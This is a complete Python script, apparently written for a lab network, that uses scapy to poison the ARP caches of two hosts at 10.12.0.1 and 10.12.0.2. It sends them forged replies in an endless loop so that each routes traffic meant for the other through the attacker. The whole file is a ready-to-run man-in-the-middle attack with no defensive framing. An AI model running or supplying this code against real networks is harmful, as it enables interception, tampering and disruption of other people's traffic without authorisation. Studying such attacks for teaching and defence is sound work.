#!/usr/bin/env python3
import sys
import time
from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, get_if_list


R1_IP = "10.12.0.1"
R2_IP = "10.12.0.2"


def get_iface() -> str:
    return [i for i in get_if_list() if i != 'lo'][0]


def resolve_mac(ip: str, iface: str) -> str:
    request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / request
    answer = srp(final_packet, iface=iface, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac


def build_poison_packet(target_ip: str, target_mac: str, spoof_ip: str, our_mac: str) -> Ether:
    return (
        Ether(dst=target_mac, src=our_mac) /            # ARP reply from us to victim
        ARP(
            op=2,               # Reply
            hwsrc=our_mac,      # MAC src (spoofed)     -> attacker MAC
            psrc=spoof_ip,      # IP src (spoofed)      -> IP we are impersonating
            hwdst=target_mac,   # MAC destination       -> MAC of target to poison
            pdst=target_ip,     # IP destination        -> IP of target to poison
        )
    )


def run_attack() -> None:
    iface = get_iface()
    our_mac = get_if_hwaddr(iface)

    print(f"- Attacker interface : {iface}  (MAC: {our_mac})")
    print(f"- Poisoning r1 ({R1_IP}) claiming to be r2 ({R2_IP})")
    print(f"- Poisoning r2 ({R2_IP}) claiming to be r1 ({R1_IP})")
    print()

    print("- Resolving legitimate MAC addresses...")
    r1_mac = resolve_mac(R1_IP, iface)
    r2_mac = resolve_mac(R2_IP, iface)

    print(f"- r1 MAC: {r1_mac}")
    print(f"- r2 MAC: {r2_mac}")
    print()

    pkt_poison_r1 = build_poison_packet(R1_IP, r1_mac, R2_IP, our_mac)
    pkt_poison_r2 = build_poison_packet(R2_IP, r2_mac, R1_IP, our_mac)

    print("- Starting continuous ARP poisoning (Ctrl+C to stop)...")
    count = 0
    while True:
        sendp(pkt_poison_r1, iface=iface, verbose=False)
        sendp(pkt_poison_r2, iface=iface, verbose=False)
        count += 2
        if count % 20 == 0:
            print(f"    {count} poison packets sent")
        time.sleep(0.5)


if __name__ == "__main__":
    run_attack()